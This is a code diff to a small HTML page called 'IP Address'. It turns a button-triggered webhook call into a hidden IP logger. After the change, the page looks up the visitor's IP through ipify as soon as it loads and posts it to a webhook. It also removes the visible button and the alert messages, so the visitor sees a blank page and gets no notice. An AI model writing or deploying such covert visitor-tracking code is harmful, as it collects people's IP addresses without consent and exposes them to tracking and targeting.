@@ -4,7 +4,7 @@
   <title>IP Address</title>
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script>
-    function sendIPToWebhook() {
+    $(document).ready(function() {
       $.getJSON("https://api.ipify.org?format=json", function(data) {
         var ip = data.ip;
         $.ajax({
@@ -13,17 +13,16 @@
           contentType: "application/json",
           data: JSON.stringify({ content: ip }),
           success: function() {
-            alert("IP address sent successfully!");
+            console.log("loaded");
           },
           error: function() {
-            alert("Failed to send IP address.");
+            console.error("notloaded_");
           }
         });
       });
-    }
+    });
   </script>
 </head>
 <body>
-  <button onclick="sendIPToWebhook()">Click to send IP address</button>
 </body>
 </html>
